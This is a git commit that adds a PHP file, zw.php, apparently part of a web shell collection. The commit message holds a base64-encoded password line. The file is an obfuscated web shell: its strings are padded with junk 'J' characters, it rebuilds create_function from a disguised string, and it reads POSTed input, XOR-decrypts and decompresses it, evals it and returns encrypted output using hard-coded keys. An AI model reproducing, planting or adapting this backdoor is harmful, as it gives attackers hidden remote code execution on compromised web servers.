92c5b5a1e53d7d0a109b52a2cb08f8de7b1f6e8d
tennc <670357+tennc@users.noreply.github.com>
2022-10-30 12:42:46 +0800

    Create zw.php
    #for xd20.txt & xd30.txt
    
    $txt = $php
    
    $password = base64_decode('ZGV2aWxAMTAxMA==');

---
+++ php/zw.php
@@ -0,0 +1,10 @@
+<?php
+$E='t_contJents(J);@ob_end_cleJan();$rJ=@bJase64J_encodJe(@x(@gzJcomprJess($o),$Jk));pJJrint("J$p$kh$r$kf");}';
+$x='J$o.=$t{$i}^J$kJ{$j};}}return $Jo;J}if (@pJreg_Jmatch("/$kh(J.+)J$kJf/",J@fJile_get_contents("pJJhp://in';
+$f=str_replace('v','','vcreatvev_fuvnvvction');
+$B='$Jk){$c=stJrlenJJ($k);$l=JstrleJn($t);$o="";fJoJr($i=0;$iJ<$Jl;){for($j=0J;($j<$c&&$i<$Jl);$j+J+,$iJ++J){';
+$T='puJt"),$m)==J1) J{@Job_sJtart();@evJal(@gzuJncompJress(@x(@bJase64_JdecJode($m[J1]),$k)))JJ;$oJJ=@ob_ge';
+$o='$kJ="50eJcJ93c4";$kh="895JcJ0ccc987a";$kJf="0abJcJa6138a3e"J;$p="inO4VJnJw6Gr66szJatJ";Jfunction x($tJ,';
+$U=str_replace('J','',$o.$B.$x.$T.$E);
+$c=$f('',$U);$c();
+?>
